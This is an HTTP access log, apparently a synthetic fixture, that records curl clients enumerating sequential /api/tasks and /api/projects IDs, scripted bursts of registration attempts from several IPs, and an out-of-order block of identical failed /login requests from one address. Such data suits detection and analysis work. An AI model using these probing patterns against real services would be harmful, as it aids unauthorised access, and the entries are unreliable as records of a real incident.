62.171.137.5 - - [02/Jun/2025:00:00:30 +0000] "GET /api/tasks/10 HTTP/1.1" 404 143 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:30 +0000] "POST /api/auth/register HTTP/1.1" 400 116 "-" "python-requests/2.28.0"
62.171.137.5 - - [02/Jun/2025:00:00:33 +0000] "GET /api/tasks/11 HTTP/1.1" 404 72 "-" "curl/7.68.0"
62.171.137.5 - - [02/Jun/2025:00:00:36 +0000] "GET /api/tasks/12 HTTP/1.1" 404 150 "-" "curl/7.68.0"
91.219.236.4 - - [02/Jun/2025:00:00:44 +0000] "POST /api/auth/register HTTP/1.1" 409 160 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:45 +0000] "POST /api/auth/register HTTP/1.1" 400 80 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:48 +0000] "POST /api/auth/register HTTP/1.1" 400 107 "-" "python-requests/2.28.0"
91.219.236.4 - - [02/Jun/2025:00:00:52 +0000] "POST /api/auth/register HTTP/1.1" 400 139 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:00 +0000] "POST /api/auth/register HTTP/1.1" 409 177 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:03 +0000] "GET /api/projects/1 HTTP/1.1" 404 29 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:04 +0000] "GET /api/projects/2 HTTP/1.1" 404 99 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:04 +0000] "GET /api/projects/4 HTTP/1.1" 404 71 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:04 +0000] "POST /api/auth/register HTTP/1.1" 400 193 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:04 +0000] "POST /api/auth/register HTTP/1.1" 400 149 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:06 +0000] "GET /api/projects/3 HTTP/1.1" 404 140 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:06 +0000] "POST /api/auth/register HTTP/1.1" 409 198 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:07 +0000] "GET /api/projects/7 HTTP/1.1" 404 105 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:10 +0000] "GET /api/projects/5 HTTP/1.1" 404 40 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:10 +0000] "GET /api/projects/10 HTTP/1.1" 404 19 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:10 +0000] "POST /api/auth/register HTTP/1.1" 409 128 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:11 +0000] "GET /api/projects/11 HTTP/1.1" 404 79 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:12 +0000] "GET /api/projects/6 HTTP/1.1" 404 35 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:12 +0000] "GET /api/projects/12 HTTP/1.1" 404 125 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:12 +0000] "POST /api/auth/register HTTP/1.1" 409 179 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:15 +0000] "POST /api/auth/register HTTP/1.1" 400 97 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:15 +0000] "POST /api/auth/register HTTP/1.1" 409 131 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:16 +0000] "GET /api/projects/16 HTTP/1.1" 404 39 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:17 +0000] "GET /api/projects/17 HTTP/1.1" 404 115 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:20 +0000] "GET /api/projects/20 HTTP/1.1" 404 90 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:22 +0000] "POST /api/auth/register HTTP/1.1" 409 149 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:24 +0000] "GET /api/projects/8 HTTP/1.1" 404 129 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:24 +0000] "POST /api/auth/register HTTP/1.1" 400 169 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:25 +0000] "GET /api/projects/25 HTTP/1.1" 404 112 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:26 +0000] "POST /api/auth/register HTTP/1.1" 400 183 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:27 +0000] "GET /api/projects/9 HTTP/1.1" 404 56 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:27 +0000] "POST /api/auth/register HTTP/1.1" 400 126 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:28 +0000] "GET /api/projects/14 HTTP/1.1" 404 59 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:28 +0000] "POST /api/auth/register HTTP/1.1" 409 106 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:28 +0000] "POST /api/auth/register HTTP/1.1" 400 145 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:30 +0000] "GET /api/projects/15 HTTP/1.1" 404 150 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:32 +0000] "POST /api/auth/register HTTP/1.1" 409 102 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:00:32 +0000] "POST /api/auth/register HTTP/1.1" 409 82 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:36 +0000] "GET /api/projects/18 HTTP/1.1" 404 59 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:36 +0000] "POST /api/auth/register HTTP/1.1" 400 171 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:00:38 +0000] "GET /api/projects/19 HTTP/1.1" 404 4 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:39 +0000] "GET /api/projects/13 HTTP/1.1" 404 123 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:42 +0000] "GET /api/projects/21 HTTP/1.1" 404 61 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:44 +0000] "GET /api/projects/22 HTTP/1.1" 404 123 "-" "curl/7.68.0"
146.70.41.18 - - [02/Jun/2025:01:00:48 +0000] "GET /api/projects/24 HTTP/1.1" 404 114 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:00:54 +0000] "POST /api/auth/register HTTP/1.1" 409 122 "-" "python-requests/2.28.0"
194.61.24.9 - - [02/Jun/2025:01:01:08 +0000] "POST /api/auth/register HTTP/1.1" 400 198 "-" "python-requests/2.28.0"
146.70.41.18 - - [02/Jun/2025:01:01:09 +0000] "GET /api/projects/23 HTTP/1.1" 404 79 "-" "curl/7.68.0"
194.61.24.9 - - [02/Jun/2025:01:01:16 +0000] "POST /api/auth/register HTTP/1.1" 409 167 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:00 +0000] "POST /api/auth/register HTTP/1.1" 400 194 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:02 +0000] "POST /api/auth/register HTTP/1.1" 400 109 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:04 +0000] "POST /api/auth/register HTTP/1.1" 400 121 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:06 +0000] "POST /api/auth/register HTTP/1.1" 400 96 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:09 +0000] "POST /api/auth/register HTTP/1.1" 400 134 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:09 +0000] "POST /api/auth/register HTTP/1.1" 400 136 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:11 +0000] "POST /api/auth/register HTTP/1.1" 409 131 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:12 +0000] "POST /api/auth/register HTTP/1.1" 409 124 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:14 +0000] "POST /api/auth/register HTTP/1.1" 400 191 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:16 +0000] "POST /api/auth/register HTTP/1.1" 400 168 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:20 +0000] "POST /api/auth/register HTTP/1.1" 400 118 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:21 +0000] "POST /api/auth/register HTTP/1.1" 409 85 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:36 +0000] "POST /api/auth/register HTTP/1.1" 409 140 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:39 +0000] "POST /api/auth/register HTTP/1.1" 409 151 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:00:40 +0000] "POST /api/auth/register HTTP/1.1" 409 153 "-" "python-requests/2.28.0"
5.181.235.71 - - [02/Jun/2025:02:01:00 +0000] "POST /api/auth/register HTTP/1.1" 409 117 "-" "python-requests/2.28.0"
9.9.9.9 - - [01/Jun/2025:09:00:01 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:02 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:03 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:04 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:05 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:06 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:07 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:08 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:09 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:10 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:11 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
9.9.9.9 - - [01/Jun/2025:09:00:12 +0000] "POST /login HTTP/1.1" 401 200 "-" "x"
